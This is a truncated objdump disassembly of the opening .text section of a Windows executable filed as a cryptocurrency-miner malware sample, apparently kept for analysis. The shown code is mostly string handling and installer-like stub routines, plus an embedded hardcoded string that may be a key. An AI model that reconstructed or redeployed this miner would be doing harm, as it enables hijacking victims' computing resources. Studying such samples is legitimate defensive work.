
malware_samples/miner/1d756584d9a8f957a4d966c4b2308167026900ccfb9359c5242c10c659a8de50.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	a1 60 e9 41 00       	mov    0x41e960,%eax
  401008:	81 ec 04 09 00 00    	sub    $0x904,%esp
  40100e:	53                   	push   %ebx
  40100f:	33 db                	xor    %ebx,%ebx
  401011:	3b c3                	cmp    %ebx,%eax
  401013:	56                   	push   %esi
  401014:	57                   	push   %edi
  401015:	74 1f                	je     0x401036
  401017:	66 39 1d 62 e9 41 00 	cmp    %bx,0x41e962
  40101e:	74 07                	je     0x401027
  401020:	ff d0                	call   *%eax
  401022:	a3 60 e9 41 00       	mov    %eax,0x41e960
  401027:	50                   	push   %eax
  401028:	e8 50 14 00 00       	call   0x40247d
  40102d:	50                   	push   %eax
  40102e:	e8 ef 84 00 00       	call   0x409522
  401033:	59                   	pop    %ecx
  401034:	eb 6e                	jmp    0x4010a4
  401036:	6a 27                	push   $0x27
  401038:	e8 40 14 00 00       	call   0x40247d
  40103d:	8b 75 08             	mov    0x8(%ebp),%esi
  401040:	ff 76 0c             	push   0xc(%esi)
  401043:	8b 3d c0 a2 41 00    	mov    0x41a2c0,%edi
  401049:	ff 36                	push   (%esi)
  40104b:	50                   	push   %eax
  40104c:	8d 85 fc f6 ff ff    	lea    -0x904(%ebp),%eax
  401052:	50                   	push   %eax
  401053:	ff d7                	call   *%edi
  401055:	83 c4 14             	add    $0x14,%esp
  401058:	39 5e 10             	cmp    %ebx,0x10(%esi)
  40105b:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40105e:	76 38                	jbe    0x401098
  401060:	8d 5e 14             	lea    0x14(%esi),%ebx
  401063:	ff 33                	push   (%ebx)
  401065:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  40106b:	68 90 a4 41 00       	push   $0x41a490
  401070:	50                   	push   %eax
  401071:	ff d7                	call   *%edi
  401073:	83 c4 0c             	add    $0xc,%esp
  401076:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  40107c:	50                   	push   %eax
  40107d:	8d 85 fc f6 ff ff    	lea    -0x904(%ebp),%eax
  401083:	50                   	push   %eax
  401084:	ff 15 78 a1 41 00    	call   *0x41a178
  40108a:	ff 45 fc             	incl   -0x4(%ebp)
  40108d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401090:	83 c3 04             	add    $0x4,%ebx
  401093:	3b 46 10             	cmp    0x10(%esi),%eax
  401096:	72 cb                	jb     0x401063
  401098:	8d 85 fc f6 ff ff    	lea    -0x904(%ebp),%eax
  40109e:	50                   	push   %eax
  40109f:	e8 7e 84 00 00       	call   0x409522
  4010a4:	59                   	pop    %ecx
  4010a5:	e8 d4 36 00 00       	call   0x40477e
  4010aa:	6a 0a                	push   $0xa
  4010ac:	ff 15 74 a1 41 00    	call   *0x41a174
  4010b2:	cc                   	int3
  4010b3:	ff 74 24 04          	push   0x4(%esp)
  4010b7:	e8 44 ff ff ff       	call   0x401000
  4010bc:	cc                   	int3
  4010bd:	56                   	push   %esi
  4010be:	8b f1                	mov    %ecx,%esi
  4010c0:	e8 25 73 00 00       	call   0x4083ea
  4010c5:	c7 06 a0 a4 41 00    	movl   $0x41a4a0,(%esi)
  4010cb:	c7 46 38 d2 07 00 00 	movl   $0x7d2,0x38(%esi)
  4010d2:	8b c6                	mov    %esi,%eax
  4010d4:	5e                   	pop    %esi
  4010d5:	c3                   	ret
  4010d6:	6a 01                	push   $0x1
  4010d8:	ff 71 04             	push   0x4(%ecx)
  4010db:	ff 15 bc a2 41 00    	call   *0x41a2bc
  4010e1:	c3                   	ret
  4010e2:	33 c0                	xor    %eax,%eax
  4010e4:	39 05 60 ea 41 00    	cmp    %eax,0x41ea60
  4010ea:	74 07                	je     0x4010f3
  4010ec:	b8 04 40 00 80       	mov    $0x80004004,%eax
  4010f1:	eb 1e                	jmp    0x401111
  4010f3:	39 44 24 08          	cmp    %eax,0x8(%esp)
  4010f7:	74 16                	je     0x40110f
  4010f9:	ff 74 24 08          	push   0x8(%esp)
  4010fd:	50                   	push   %eax
  4010fe:	68 02 80 00 00       	push   $0x8002
  401103:	ff 35 58 ea 41 00    	push   0x41ea58
  401109:	ff 15 b8 a2 41 00    	call   *0x41a2b8
  40110f:	33 c0                	xor    %eax,%eax
  401111:	c2 08 00             	ret    $0x8
  401114:	8b 44 24 04          	mov    0x4(%esp),%eax
  401118:	83 60 1c 00          	andl   $0x0,0x1c(%eax)
  40111c:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  401121:	75 07                	jne    0x40112a
  401123:	c7 40 1c 01 00 00 00 	movl   $0x1,0x1c(%eax)
  40112a:	33 c0                	xor    %eax,%eax
  40112c:	c2 08 00             	ret    $0x8
  40112f:	a0 70 e9 41 00       	mov    0x41e970,%al
  401134:	f6 d8                	neg    %al
  401136:	1b c0                	sbb    %eax,%eax
  401138:	83 e0 0b             	and    $0xb,%eax
  40113b:	83 c0 08             	add    $0x8,%eax
  40113e:	c3                   	ret
  40113f:	ff 74 24 10          	push   0x10(%esp)
  401143:	8b 44 24 08          	mov    0x8(%esp),%eax
  401147:	ff 74 24 10          	push   0x10(%esp)
  40114b:	c7 05 60 e9 41 00 2f 	movl   $0x40112f,0x41e960
  401152:	11 40 00 
  401155:	ff 74 24 10          	push   0x10(%esp)
  401159:	8b 08                	mov    (%eax),%ecx
  40115b:	50                   	push   %eax
  40115c:	ff 51 0c             	call   *0xc(%ecx)
  40115f:	83 25 60 e9 41 00 00 	andl   $0x0,0x41e960
  401166:	c3                   	ret
  401167:	33 c0                	xor    %eax,%eax
  401169:	c2 0c 00             	ret    $0xc
  40116c:	8b 54 24 08          	mov    0x8(%esp),%edx
  401170:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401174:	0f b7 02             	movzwl (%edx),%eax
  401177:	66 89 01             	mov    %ax,(%ecx)
  40117a:	41                   	inc    %ecx
  40117b:	41                   	inc    %ecx
  40117c:	42                   	inc    %edx
  40117d:	42                   	inc    %edx
  40117e:	66 85 c0             	test   %ax,%ax
  401181:	75 f1                	jne    0x401174
  401183:	c3                   	ret
  401184:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401188:	33 c0                	xor    %eax,%eax
  40118a:	66 39 01             	cmp    %ax,(%ecx)
  40118d:	74 08                	je     0x401197
  40118f:	40                   	inc    %eax
  401190:	66 83 3c 41 00       	cmpw   $0x0,(%ecx,%eax,2)
  401195:	75 f8                	jne    0x40118f
  401197:	c3                   	ret
  401198:	ff 74 24 04          	push   0x4(%esp)
  40119c:	ff 15 54 a2 41 00    	call   *0x41a254
  4011a2:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4011a6:	89 01                	mov    %eax,(%ecx)
  4011a8:	f7 d8                	neg    %eax
  4011aa:	1b c0                	sbb    %eax,%eax
  4011ac:	25 f2 ff f8 7f       	and    $0x7ff8fff2,%eax
  4011b1:	05 0e 00 07 80       	add    $0x8007000e,%eax
  4011b6:	c3                   	ret
  4011b7:	53                   	push   %ebx
  4011b8:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  4011bc:	56                   	push   %esi
  4011bd:	8b f1                	mov    %ecx,%esi
  4011bf:	43                   	inc    %ebx
  4011c0:	3b 5e 08             	cmp    0x8(%esi),%ebx
  4011c3:	74 4c                	je     0x401211
  4011c5:	57                   	push   %edi
  4011c6:	33 c9                	xor    %ecx,%ecx
  4011c8:	6a 02                	push   $0x2
  4011ca:	5a                   	pop    %edx
  4011cb:	8b c3                	mov    %ebx,%eax
  4011cd:	f7 e2                	mul    %edx
  4011cf:	0f 90 c1             	seto   %cl
  4011d2:	f7 d9                	neg    %ecx
  4011d4:	0b c8                	or     %eax,%ecx
  4011d6:	51                   	push   %ecx
  4011d7:	e8 94 80 01 00       	call   0x419270
  4011dc:	8b f8                	mov    %eax,%edi
  4011de:	33 c0                	xor    %eax,%eax
  4011e0:	39 46 08             	cmp    %eax,0x8(%esi)
  4011e3:	59                   	pop    %ecx
  4011e4:	7e 1d                	jle    0x401203
  4011e6:	39 46 04             	cmp    %eax,0x4(%esi)
  4011e9:	7e 10                	jle    0x4011fb
  4011eb:	8b 0e                	mov    (%esi),%ecx
  4011ed:	66 8b 0c 41          	mov    (%ecx,%eax,2),%cx
  4011f1:	66 89 0c 47          	mov    %cx,(%edi,%eax,2)
  4011f5:	40                   	inc    %eax
  4011f6:	3b 46 04             	cmp    0x4(%esi),%eax
  4011f9:	7c f0                	jl     0x4011eb
  4011fb:	ff 36                	push   (%esi)
  4011fd:	e8 68 80 01 00       	call   0x41926a
  401202:	59                   	pop    %ecx
  401203:	8b 46 04             	mov    0x4(%esi),%eax
  401206:	89 3e                	mov    %edi,(%esi)
  401208:	66 83 24 47 00       	andw   $0x0,(%edi,%eax,2)
  40120d:	89 5e 08             	mov    %ebx,0x8(%esi)
  401210:	5f                   	pop    %edi
  401211:	5e                   	pop    %esi
  401212:	5b                   	pop    %ebx
  401213:	c2 04 00             	ret    $0x4
  401216:	56                   	push   %esi
  401217:	8b f1                	mov    %ecx,%esi
  401219:	ff 76 5c             	push   0x5c(%esi)
  40121c:	e8 49 80 01 00       	call   0x41926a
  401221:	59                   	pop    %ecx
  401222:	8b ce                	mov    %esi,%ecx
  401224:	5e                   	pop    %esi
  401225:	e9 94 6f 00 00       	jmp    0x4081be
  40122a:	55                   	push   %ebp
  40122b:	8b ec                	mov    %esp,%ebp
  40122d:	51                   	push   %ecx
  40122e:	51                   	push   %ecx
  40122f:	f6 05 c8 e9 41 00 01 	testb  $0x1,0x41e9c8
  401236:	75 56                	jne    0x40128e
  401238:	6a 00                	push   $0x0
  40123a:	6a 00                	push   $0x0
  40123c:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40123f:	50                   	push   %eax
  401240:	ff 35 e8 e9 41 00    	push   0x41e9e8
  401246:	ff 15 7c a1 41 00    	call   *0x41a17c
  40124c:	85 c0                	test   %eax,%eax
  40124e:	74 3e                	je     0x40128e
  401250:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401253:	3b 45 10             	cmp    0x10(%ebp),%eax
  401256:	77 36                	ja     0x40128e
  401258:	72 08                	jb     0x401262
  40125a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40125d:	3b 45 0c             	cmp    0xc(%ebp),%eax
  401260:	73 2c                	jae    0x40128e
  401262:	6a 2a                	push   $0x2a
  401264:	e8 14 12 00 00       	call   0x40247d
  401269:	50                   	push   %eax
  40126a:	e8 2a 83 00 00       	call   0x409599
  40126f:	83 f8 01             	cmp    $0x1,%eax
  401272:	59                   	pop    %ecx
  401273:	59                   	pop    %ecx
  401274:	74 11                	je     0x401287
  401276:	c7 05 6c e9 41 00 6a 	movl   $0x6a,0x41e96c
  40127d:	00 00 00 
  401280:	b8 05 40 00 80       	mov    $0x80004005,%eax
  401285:	eb 20                	jmp    0x4012a7
  401287:	83 0d c8 e9 41 00 01 	orl    $0x1,0x41e9c8
  40128e:	8d 45 0c             	lea    0xc(%ebp),%eax
  401291:	50                   	push   %eax
  401292:	6a 00                	push   $0x0
  401294:	68 01 80 00 00       	push   $0x8001
  401299:	ff 35 58 ea 41 00    	push   0x41ea58
  40129f:	ff 15 b8 a2 41 00    	call   *0x41a2b8
  4012a5:	33 c0                	xor    %eax,%eax
  4012a7:	c9                   	leave
  4012a8:	c2 0c 00             	ret    $0xc
  4012ab:	8b 44 24 08          	mov    0x8(%esp),%eax
  4012af:	85 c0                	test   %eax,%eax
  4012b1:	74 0c                	je     0x4012bf
  4012b3:	a3 6c e9 41 00       	mov    %eax,0x41e96c
  4012b8:	b8 05 40 00 80       	mov    $0x80004005,%eax
  4012bd:	eb 3a                	jmp    0x4012f9
  4012bf:	56                   	push   %esi
  4012c0:	8b 74 24 08          	mov    0x8(%esp),%esi
  4012c4:	57                   	push   %edi
  4012c5:	8d 7e 24             	lea    0x24(%esi),%edi
  4012c8:	83 3f 00             	cmpl   $0x0,(%edi)
  4012cb:	74 0f                	je     0x4012dc
  4012cd:	8b 4e 20             	mov    0x20(%esi),%ecx
  4012d0:	8d 46 34             	lea    0x34(%esi),%eax
  4012d3:	50                   	push   %eax
  4012d4:	83 c1 08             	add    $0x8,%ecx
  4012d7:	e8 c0 11 01 00       	call   0x41249c
  4012dc:	8b cf                	mov    %edi,%ecx
  4012de:	e8 da 29 01 00       	call   0x413cbd
  4012e3:	83 7e 1c 00          	cmpl   $0x0,0x1c(%esi)
  4012e7:	74 0c                	je     0x4012f5
  4012e9:	ff 76 40             	push   0x40(%esi)
  4012ec:	ff 76 28             	push   0x28(%esi)
  4012ef:	ff 15 80 a1 41 00    	call   *0x41a180
  4012f5:	5f                   	pop    %edi
  4012f6:	33 c0                	xor    %eax,%eax
  4012f8:	5e                   	pop    %esi
  4012f9:	c2 08 00             	ret    $0x8
  4012fc:	55                   	push   %ebp
  4012fd:	8b ec                	mov    %esp,%ebp
  4012ff:	56                   	push   %esi
  401300:	ff 75 10             	push   0x10(%ebp)
  401303:	ff 15 84 a1 41 00    	call   *0x41a184
  401309:	83 7d 0c 6a          	cmpl   $0x6a,0xc(%ebp)
  40130d:	8b 75 08             	mov    0x8(%ebp),%esi
  401310:	75 07                	jne    0x401319
  401312:	ff 76 28             	push   0x28(%esi)
  401315:	6a 1e                	push   $0x1e
  401317:	eb 0b                	jmp    0x401324
  401319:	83 7d 0c 69          	cmpl   $0x69,0xc(%ebp)
  40131d:	75 0f                	jne    0x40132e
  40131f:	ff 76 28             	push   0x28(%esi)
  401322:	6a 1f                	push   $0x1f
  401324:	6a 01                	push   $0x1
  401326:	e8 db 82 00 00       	call   0x409606
  40132b:	83 c4 0c             	add    $0xc,%esp
  40132e:	ff 75 0c             	push   0xc(%ebp)
  401331:	8b 06                	mov    (%esi),%eax
  401333:	56                   	push   %esi
  401334:	ff 50 1c             	call   *0x1c(%eax)
  401337:	5e                   	pop    %esi
  401338:	5d                   	pop    %ebp
  401339:	c2 0c 00             	ret    $0xc
  40133c:	83 3d c4 e9 41 00 02 	cmpl   $0x2,0x41e9c4
  401343:	74 13                	je     0x401358
  401345:	eb 08                	jmp    0x40134f
  401347:	6a 14                	push   $0x14
  401349:	ff 15 88 a1 41 00    	call   *0x41a188
  40134f:	83 3d 58 ea 41 00 00 	cmpl   $0x0,0x41ea58
  401356:	74 ef                	je     0x401347
  401358:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40135c:	8b 41 0c             	mov    0xc(%ecx),%eax
  40135f:	8b 10                	mov    (%eax),%edx
  401361:	56                   	push   %esi
  401362:	51                   	push   %ecx
  401363:	33 c9                	xor    %ecx,%ecx
  401365:	83 3d 6c ea 41 00 02 	cmpl   $0x2,0x41ea6c
  40136c:	0f 94 c1             	sete   %cl
  40136f:	51                   	push   %ecx
  401370:	6a ff                	push   $0xffffffff
  401372:	6a 00                	push   $0x0
  401374:	50                   	push   %eax
  401375:	ff 52 1c             	call   *0x1c(%edx)
  401378:	83 3d c4 e9 41 00 02 	cmpl   $0x2,0x41e9c4
  40137f:	8b f0                	mov    %eax,%esi
  401381:	74 0e                	je     0x401391
  401383:	6a 00                	push   $0x0
  401385:	ff 35 58 ea 41 00    	push   0x41ea58
  40138b:	ff 15 bc a2 41 00    	call   *0x41a2bc
  401391:	8b c6                	mov    %esi,%eax
  401393:	5e                   	pop    %esi
  401394:	c2 04 00             	ret    $0x4
  401397:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40139b:	ff 49 08             	decl   0x8(%ecx)
  40139e:	8b 41 08             	mov    0x8(%ecx),%eax
  4013a1:	75 09                	jne    0x4013ac
  4013a3:	51                   	push   %ecx
  4013a4:	e8 c1 7e 01 00       	call   0x41926a
  4013a9:	59                   	pop    %ecx
  4013aa:	33 c0                	xor    %eax,%eax
  4013ac:	c2 04 00             	ret    $0x4
  4013af:	6a 10                	push   $0x10
  4013b1:	ff 74 24 0c          	push   0xc(%esp)
  4013b5:	ff 74 24 0c          	push   0xc(%esp)
  4013b9:	e8 b8 7e 01 00       	call   0x419276
  4013be:	83 c4 0c             	add    $0xc,%esp
  4013c1:	f7 d8                	neg    %eax
  4013c3:	1b c0                	sbb    %eax,%eax
  4013c5:	40                   	inc    %eax
  4013c6:	c3                   	ret
  4013c7:	83 6c 24 04 04       	subl   $0x4,0x4(%esp)
  4013cc:	e9 c6 ff ff ff       	jmp    0x401397
  4013d1:	56                   	push   %esi
  4013d2:	8b f1                	mov    %ecx,%esi
  4013d4:	33 c0                	xor    %eax,%eax
  4013d6:	57                   	push   %edi
  4013d7:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  4013db:	89 06                	mov    %eax,(%esi)
  4013dd:	89 46 04             	mov    %eax,0x4(%esi)
  4013e0:	89 46 08             	mov    %eax,0x8(%esi)
  4013e3:	ff 77 04             	push   0x4(%edi)
  4013e6:	e8 cc fd ff ff       	call   0x4011b7
  4013eb:	ff 37                	push   (%edi)
  4013ed:	ff 36                	push   (%esi)
  4013ef:	e8 78 fd ff ff       	call   0x40116c
  4013f4:	8b 47 04             	mov    0x4(%edi),%eax
  4013f7:	59                   	pop    %ecx
  4013f8:	59                   	pop    %ecx
  4013f9:	89 46 04             	mov    %eax,0x4(%esi)
  4013fc:	5f                   	pop    %edi
  4013fd:	8b c6                	mov    %esi,%eax
  4013ff:	5e                   	pop    %esi
  401400:	c2 04 00             	ret    $0x4
  401403:	56                   	push   %esi
  401404:	8b f1                	mov    %ecx,%esi
  401406:	8b 06                	mov    (%esi),%eax
  401408:	83 66 04 00          	andl   $0x0,0x4(%esi)
  40140c:	66 83 20 00          	andw   $0x0,(%eax)
  401410:	57                   	push   %edi
  401411:	ff 74 24 0c          	push   0xc(%esp)
  401415:	e8 6a fd ff ff       	call   0x401184
  40141a:	59                   	pop    %ecx
  40141b:	8b f8                	mov    %eax,%edi
  40141d:	57                   	push   %edi
  40141e:	8b ce                	mov    %esi,%ecx
  401420:	e8 92 fd ff ff       	call   0x4011b7
  401425:	ff 74 24 0c          	push   0xc(%esp)
  401429:	ff 36                	push   (%esi)
  40142b:	e8 3c fd ff ff       	call   0x40116c
  401430:	59                   	pop    %ecx
  401431:	59                   	pop    %ecx
  401432:	89 7e 04             	mov    %edi,0x4(%esi)
  401435:	5f                   	pop    %edi
  401436:	8b c6                	mov    %esi,%eax
  401438:	5e                   	pop    %esi
  401439:	c2 04 00             	ret    $0x4
  40143c:	56                   	push   %esi
  40143d:	57                   	push   %edi
  40143e:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  401442:	8b f1                	mov    %ecx,%esi
  401444:	3b fe                	cmp    %esi,%edi
  401446:	74 23                	je     0x40146b
  401448:	83 66 04 00          	andl   $0x0,0x4(%esi)
  40144c:	8b 06                	mov    (%esi),%eax
  40144e:	66 83 20 00          	andw   $0x0,(%eax)
  401452:	ff 77 04             	push   0x4(%edi)
  401455:	e8 5d fd ff ff       	call   0x4011b7
  40145a:	ff 37                	push   (%edi)
  40145c:	ff 36                	push   (%esi)
  40145e:	e8 09 fd ff ff       	call   0x40116c
  401463:	8b 47 04             	mov    0x4(%edi),%eax
  401466:	59                   	pop    %ecx
  401467:	59                   	pop    %ecx
  401468:	89 46 04             	mov    %eax,0x4(%esi)
  40146b:	5f                   	pop    %edi
  40146c:	8b c6                	mov    %esi,%eax
  40146e:	5e                   	pop    %esi
  40146f:	c2 04 00             	ret    $0x4
  401472:	53                   	push   %ebx
  401473:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  401477:	56                   	push   %esi
  401478:	57                   	push   %edi
  401479:	8b 79 08             	mov    0x8(%ecx),%edi
  40147c:	8b f7                	mov    %edi,%esi
  40147e:	2b 71 04             	sub    0x4(%ecx),%esi
  401481:	4e                   	dec    %esi
  401482:	3b de                	cmp    %esi,%ebx
  401484:	7e 30                	jle    0x4014b6
  401486:	83 ff 40             	cmp    $0x40,%edi
  401489:	7e 09                	jle    0x401494
  40148b:	8b c7                	mov    %edi,%eax
  40148d:	99                   	cltd
  40148e:	2b c2                	sub    %edx,%eax
  401490:	d1 f8                	sar    $1,%eax
  401492:	eb 0f                	jmp    0x4014a3
  401494:	33 c0                	xor    %eax,%eax
  401496:	83 ff 08             	cmp    $0x8,%edi
  401499:	0f 9e c0             	setle  %al
  40149c:	48                   	dec    %eax
  40149d:	83 e0 0c             	and    $0xc,%eax
  4014a0:	83 c0 04             	add    $0x4,%eax
  4014a3:	8d 14 30             	lea    (%eax,%esi,1),%edx
  4014a6:	3b d3                	cmp    %ebx,%edx
  4014a8:	7d 04                	jge    0x4014ae
  4014aa:	2b de                	sub    %esi,%ebx
  4014ac:	8b c3                	mov    %ebx,%eax
  4014ae:	03 f8                	add    %eax,%edi
  4014b0:	57                   	push   %edi
  4014b1:	e8 01 fd ff ff       	call   0x4011b7
  4014b6:	5f                   	pop    %edi
  4014b7:	5e                   	pop    %esi
  4014b8:	5b                   	pop    %ebx
  4014b9:	c2 04 00             	ret    $0x4
  4014bc:	56                   	push   %esi
  4014bd:	57                   	push   %edi
  4014be:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  4014c2:	ff 77 04             	push   0x4(%edi)
  4014c5:	8b f1                	mov    %ecx,%esi
  4014c7:	e8 a6 ff ff ff       	call   0x401472
  4014cc:	8b 46 04             	mov    0x4(%esi),%eax
  4014cf:	8b 0e                	mov    (%esi),%ecx
  4014d1:	ff 37                	push   (%edi)
  4014d3:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  4014d6:	50                   	push   %eax
  4014d7:	e8 90 fc ff ff       	call   0x40116c
  4014dc:	8b 47 04             	mov    0x4(%edi),%eax
  4014df:	01 46 04             	add    %eax,0x4(%esi)
  4014e2:	59                   	pop    %ecx
  4014e3:	59                   	pop    %ecx
  4014e4:	5f                   	pop    %edi
  4014e5:	8b c6                	mov    %esi,%eax
  4014e7:	5e                   	pop    %esi
  4014e8:	c2 04 00             	ret    $0x4
  4014eb:	56                   	push   %esi
  4014ec:	8b f1                	mov    %ecx,%esi
  4014ee:	33 c0                	xor    %eax,%eax
  4014f0:	6a 03                	push   $0x3
  4014f2:	89 06                	mov    %eax,(%esi)
  4014f4:	89 46 04             	mov    %eax,0x4(%esi)
  4014f7:	89 46 08             	mov    %eax,0x8(%esi)
  4014fa:	e8 b8 fc ff ff       	call   0x4011b7
  4014ff:	8b c6                	mov    %esi,%eax
  401501:	5e                   	pop    %esi
  401502:	c3                   	ret
  401503:	ff 74 24 04          	push   0x4(%esp)
  401507:	b9 74 e9 41 00       	mov    $0x41e974,%ecx
  40150c:	e8 f2 fe ff ff       	call   0x401403
  401511:	c6 05 70 e9 41 00 01 	movb   $0x1,0x41e970
  401518:	c3                   	ret
  401519:	56                   	push   %esi
  40151a:	8b f1                	mov    %ecx,%esi
  40151c:	e8 9c fb ff ff       	call   0x4010bd
  401521:	8d 4e 5c             	lea    0x5c(%esi),%ecx
  401524:	c7 06 f4 a4 41 00    	movl   $0x41a4f4,(%esi)
  40152a:	e8 bc ff ff ff       	call   0x4014eb
  40152f:	c7 46 38 d7 07 00 00 	movl   $0x7d7,0x38(%esi)
  401536:	8b c6                	mov    %esi,%eax
  401538:	5e                   	pop    %esi
  401539:	c3                   	ret
  40153a:	56                   	push   %esi
  40153b:	8b f1                	mov    %ecx,%esi
  40153d:	e8 d4 fc ff ff       	call   0x401216
  401542:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  401547:	74 07                	je     0x401550
  401549:	56                   	push   %esi
  40154a:	e8 1b 7d 01 00       	call   0x41926a
  40154f:	59                   	pop    %ecx
  401550:	8b c6                	mov    %esi,%eax
  401552:	5e                   	pop    %esi
  401553:	c2 04 00             	ret    $0x4
  401556:	55                   	push   %ebp
  401557:	8b ec                	mov    %esp,%ebp
  401559:	83 ec 68             	sub    $0x68,%esp
  40155c:	56                   	push   %esi
  40155d:	8d 4d 98             	lea    -0x68(%ebp),%ecx
  401560:	e8 b4 ff ff ff       	call   0x401519
  401565:	eb 1a                	jmp    0x401581
  401567:	38 00                	cmp    %al,(%eax)
  401569:	7a 00                	jp     0x40156b
  40156b:	38 00                	cmp    %al,(%eax)
  40156d:	34 00                	xor    $0x0,%al
  40156f:	6f                   	outsl  %ds:(%esi),(%dx)
  401570:	00 48 00             	add    %cl,0x0(%eax)
  401573:	49                   	dec    %ecx
  401574:	00 4b 00             	add    %cl,0x0(%ebx)
  401577:	4a                   	dec    %edx
  401578:	00 39                	add    %bh,(%ecx)
  40157a:	00 47 00             	add    %al,0x0(%edi)
  40157d:	33 00                	xor    (%eax),%eax
  40157f:	00 00                	add    %al,(%eax)
  401581:	8b 44 24 fc          	mov    -0x4(%esp),%eax
  401585:	40                   	inc    %eax
  401586:	40                   	inc    %eax
  401587:	50                   	push   %eax
  401588:	e8 76 ff ff ff       	call   0x401503
  40158d:	33 f6                	xor    %esi,%esi
  40158f:	59                   	pop    %ecx
  401590:	46                   	inc    %esi
  401591:	ff 75 f4             	push   -0xc(%ebp)
  401594:	e8 d1 7c 01 00       	call   0x41926a
  401599:	59                   	pop    %ecx
  40159a:	8d 4d 98             	lea    -0x68(%ebp),%ecx
  40159d:	e8 1c 6c 00 00       	call   0x4081be
  4015a2:	8b c6                	mov    %esi,%eax
  4015a4:	5e                   	pop    %esi
  4015a5:	c9                   	leave
  4015a6:	c3                   	ret
  4015a7:	33 f6                	xor    %esi,%esi
  4015a9:	eb e6                	jmp    0x401591
  4015ab:	80 3d 70 e9 41 00 00 	cmpb   $0x0,0x41e970
  4015b2:	75 10                	jne    0x4015c4
  4015b4:	e8 9d ff ff ff       	call   0x401556
  4015b9:	85 c0                	test   %eax,%eax
  4015bb:	75 07                	jne    0x4015c4
  4015bd:	b8 05 40 00 80       	mov    $0x80004005,%eax
  4015c2:	eb 11                	jmp    0x4015d5
  4015c4:	ff 74 24 08          	push   0x8(%esp)
  4015c8:	ff 35 74 e9 41 00    	push   0x41e974
  4015ce:	e8 c5 fb ff ff       	call   0x401198
  4015d3:	59                   	pop    %ecx
  4015d4:	59                   	pop    %ecx
  4015d5:	c2 08 00             	ret    $0x8
  4015d8:	55                   	push   %ebp
  4015d9:	8b ec                	mov    %esp,%ebp
  4015db:	83 ec 20             	sub    $0x20,%esp
  4015de:	53                   	push   %ebx
  4015df:	33 db                	xor    %ebx,%ebx
  4015e1:	38 1d 70 e9 41 00    	cmp    %bl,0x41e970
  4015e7:	57                   	push   %edi
  4015e8:	74 08                	je     0x4015f2
  4015ea:	33 c0                	xor    %eax,%eax
  4015ec:	40                   	inc    %eax
  4015ed:	e9 de 00 00 00       	jmp    0x4016d0
  4015f2:	68 e8 01 00 00       	push   $0x1e8
  4015f7:	e8 74 7c 01 00       	call   0x419270
  4015fc:	3b c3                	cmp    %ebx,%eax
  4015fe:	59                   	pop    %ecx
  4015ff:	74 09                	je     0x40160a
  401601:	8b c8                	mov    %eax,%ecx
  401603:	e8 62 4b 01 00       	call   0x41616a
  401608:	eb 02                	jmp    0x40160c
  40160a:	33 c0                	xor    %eax,%eax
  40160c:	56                   	push   %esi
  40160d:	50                   	push   %eax
  40160e:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  401611:	e8 38 1d 01 00       	call   0x41334e
  401616:	8b 75 08             	mov    0x8(%ebp),%esi
  401619:	8b 06                	mov    (%esi),%eax
  40161b:	53                   	push   %ebx
  40161c:	53                   	push   %ebx
  40161d:	53                   	push   %ebx
  40161e:	53                   	push   %ebx
  40161f:	56                   	push   %esi
  401620:	ff 50 10             	call   *0x10(%eax)
  401623:	8d 45 f0             	lea    -0x10(%ebp),%eax
  401626:	50                   	push   %eax
  401627:	68 90 b4 41 00       	push   $0x41b490
  40162c:	56                   	push   %esi
  40162d:	8b 75 fc             	mov    -0x4(%ebp),%esi
  401630:	56                   	push   %esi
  401631:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  401634:	c7 45 f0 e0 a4 41 00 	movl   $0x41a4e0,-0x10(%ebp)
  40163b:	c7 45 f4 d0 a4 41 00 	movl   $0x41a4d0,-0xc(%ebp)
  401642:	e8 f8 fa ff ff       	call   0x40113f
  401647:	83 c4 10             	add    $0x10,%esp
  40164a:	85 c0                	test   %eax,%eax
  40164c:	75 75                	jne    0x4016c3
  40164e:	38 1d 70 e9 41 00    	cmp    %bl,0x41e970
  401654:	75 45                	jne    0x40169b
  401656:	8b 06                	mov    (%esi),%eax
  401658:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  40165b:	51                   	push   %ecx
  40165c:	56                   	push   %esi
  40165d:	ff 50 14             	call   *0x14(%eax)
  401660:	33 ff                	xor    %edi,%edi
  401662:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
  401665:	76 34                	jbe    0x40169b
  401667:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40166a:	51                   	push   %ecx
  40166b:	6a 0f                	push   $0xf
  40166d:	57                   	push   %edi
  40166e:	66 89 5d e0          	mov    %bx,-0x20(%ebp)
  401672:	66 89 5d e2          	mov    %bx,-0x1e(%ebp)
  401676:	8b 06                	mov    (%esi),%eax
  401678:	56                   	push   %esi
  401679:	ff 50 18             	call   *0x18(%eax)
  40167c:	85 c0                	test   %eax,%eax
  40167e:	75 0d                	jne    0x40168d
  401680:	66 83 7d e0 0b       	cmpw   $0xb,-0x20(%ebp)
  401685:	75 06                	jne    0x40168d
  401687:	66 39 5d e8          	cmp    %bx,-0x18(%ebp)
  40168b:	75 1d                	jne    0x4016aa
  40168d:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  401690:	e8 df 0e 01 00       	call   0x412574
  401695:	47                   	inc    %edi
